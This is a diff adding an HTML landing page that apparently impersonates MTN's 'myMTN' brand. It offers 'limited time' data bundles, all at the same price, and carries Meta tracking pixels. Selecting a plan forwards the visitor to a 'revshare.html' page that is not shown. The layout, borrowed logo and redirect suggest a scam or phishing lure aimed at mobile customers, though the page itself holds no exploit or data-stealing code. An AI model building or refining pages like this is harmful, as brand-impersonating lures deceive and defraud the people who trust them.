@@ -1,0 +1,331 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Plans</title>
+
+<!-- Meta Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '1784407552737321');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=1784407552737321&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Meta Pixel Code -->
+
+    
+<!-- Meta Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '1696734518245287');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=1696734518245287&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Meta Pixel Code -->
+
+<style>
+*{
+    margin:0;
+    padding:0;
+    box-sizing:border-box;
+    font-family:Arial, Helvetica, sans-serif;
+}
+
+body{
+    background:#f5f5f5;
+    color:#111;
+}
+
+.header{
+    background:#022847;
+    color:#fff;
+    padding:15px;
+}
+
+.logo-row{
+    display:flex;
+    align-items:center;
+    gap:12px;
+}
+
+.logo{
+    width:52px;
+    height:52px;
+    border-radius:12px;
+    background:#ffcb05;
+    color:#000;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    font-weight:bold;
+    font-size:24px;
+}
+
+.brand{
+    line-height:1.2;
+}
+
+.brand h2{
+    font-size:20px;
+}
+
+.brand p{
+    color:#f8c400;
+    font-size:12px;
+}
+
+.nav{
+    display:flex;
+    justify-content:space-around;
+    margin-top:12px;
+    font-size:18px;
+}
+
+.container{
+    max-width:420px;
+    margin:auto;
+    padding:20px;
+}
+
+.banner{
+    background:linear-gradient(135deg,#012f52,#001f35);
+    color:#fff;
+    border-radius:30px;
+    padding:30px;
+    margin-bottom:25px;
+}
+
+.banner h1{
+    font-size:28px;
+    margin-bottom:15px;
+}
+
+.banner p{
+    font-size:16px;
+    line-height:1.5;
+}
+
+.offer{
+    display:inline-block;
+    margin-top:15px;
+    padding:10px 18px;
+    border-radius:30px;
+    border:2px solid rgba(255,204,0,.4);
+    background:rgba(255,204,0,.15);
+    font-weight:bold;
+}
+
+.card{
+    background:#fff;
+    border-radius:30px;
+    padding:25px;
+    box-shadow:0 4px 15px rgba(0,0,0,.08);
+}
+
+.title{
+    text-align:center;
+    font-size:20px;
+    font-weight:bold;
+    margin-bottom:25px;
+}
+
+/* --- ADJUSTED DIMENSIONS TO MATCH YOUR NEW EXAMPLE IMAGE --- */
+
+.plan{
+    display:flex;
+    justify-content:space-between;
+    align-items:center;
+    border:2px solid #eee;
+    border-radius:40px;
+    padding:16px 24px; /* Increased padding slightly so it's not too small */
+    margin-bottom:14px; /* Perfectly balanced spacing between the options */
+    cursor:pointer;
+    transition:.3s;
+}
+
+.plan:hover{
+    border-color:#ffcb05;
+}
+
+.plan.active{
+    border-color:#ffcb05;
+    background:#fffdf2;
+}
+
+.plan-left{
+    display:flex;
+    gap:24px; /* Balanced spacing between columns */
+    align-items:center;
+}
+
+.price{
+    font-size:19px; /* Increased from 17px so it stands out like your example */
+    font-weight:bold;
+}
+
+.data{
+    font-size:18px; /* Increased from 17px for optimal readability */
+}
+
+.radio{
+    width:22px;   /* Adjusted to match the exact size in your example image */
+    height:22px;  
+    border:3px solid #ffcb05;
+    border-radius:50%;
+    position:relative;
+}
+
+/* --- REST OF CODE REMAINS COMPLETELY UNTOUCHED --- */
+
+.plan.active .radio::after{
+    content:'';
+    width:14px;
+    height:14px;
+    background:#ffcb05;
+    border-radius:50%;
+    position:absolute;
+    top:4px;
+    left:4px;
+}
+
+.continue-btn{
+    width:100%;
+    border:none;
+    margin-top:10px;
+    padding:18px;
+    border-radius:40px;
+    background:#ffd55c;
+    font-size:24px;
+    font-weight:bold;
+    cursor:not-allowed;
+    opacity:.5;
+}
+
+.continue-btn.enabled{
+    opacity:1;
+    cursor:pointer;
+}
+</style>
+</head>
+<body>
+
+<div class="header">
+    <div class="logo-row">
+        <img src="https://i.postimg.cc/9XKHthBS/images.png" alt="MTN Logo" style="width:52px; height:52px; object-fit:contain;">
+      <div class="brand">
+            <h2>myMTN</h2>
+            <p>Y'ello! Better & Faster</p>
+        </div>
+    </div>
+
+    <div class="nav">
+        <span>Home</span>
+        <span>Share Data</span>
+        <span>5G Network</span>
+    </div>
+</div>
+
+<div class="container">
+
+    <div class="banner">
+        <h1>Amazing Data Plans</h1>
+        <p>🔥</p>
+        <p>Get up to 20GB + Bonus on selected plans</p>
+
+        <div class="offer">
+            ⚡ Limited Time Offer
+        </div>
+    </div>
+
+    <div class="card">
+
+        <div class="title">
+            💎 Select Data Plan
+        </div>
+
+        <div class="plan" data-plan="100" data-bundle="5GB" data-price="30">
+            <div class="plan-left">
+                <div class="price">5GB</div>
+                <div class="data">   (30 Days)</div>
+            </div>
+            <div class="radio"></div>
+        </div>
+
+        <div class="plan" data-plan="200" data-bundle="10GB" data-price="30">
+            <div class="plan-left">
+                <div class="price">10GB</div>
+                <div class="data">    (30 Days)</div>
+            </div>
+            <div class="radio"></div>
+        </div>
+
+        <div class="plan" data-plan="300" data-bundle="20GB" data-price="30">
+            <div class="plan-left">
+                <div class="price">20GB</div>
+                <div class="data">    (30 Days)</div>
+            </div>
+            <div class="radio"></div>
+        </div>
+
+        <button id="continueBtn" class="continue-btn">
+            Continue →
+        </button>
+
+    </div>
+
+</div>
+
+<script>
+let selectedPlan = null;
+let selectedBundle = "";
+let selectedPrice = "";
+
+const plans = document.querySelectorAll('.plan');
+const continueBtn = document.getElementById('continueBtn');
+
+plans.forEach(plan => {
+    plan.addEventListener('click', () => {
+
+        plans.forEach(p => p.classList.remove('active'));
+
+        plan.classList.add('active');
+        selectedPlan = plan.dataset.plan;
+        
+        // Grab the specific bundle size and price of the clicked plan
+        selectedBundle = plan.getAttribute('data-bundle');
+        selectedPrice = plan.getAttribute('data-price');
+
+        continueBtn.classList.add('enabled');
+    });
+});
+
+continueBtn.addEventListener('click', () => {
+
+    if(!selectedPlan) return;
+
+    // Generates the URL with variables attached dynamically matching your exact plan selection
+    window.location.href = "revshare.html?bundle=" + encodeURIComponent(selectedBundle) + "&price=" + encodeURIComponent(selectedPrice);
+});
+</script>
+
+</body>
+</html>
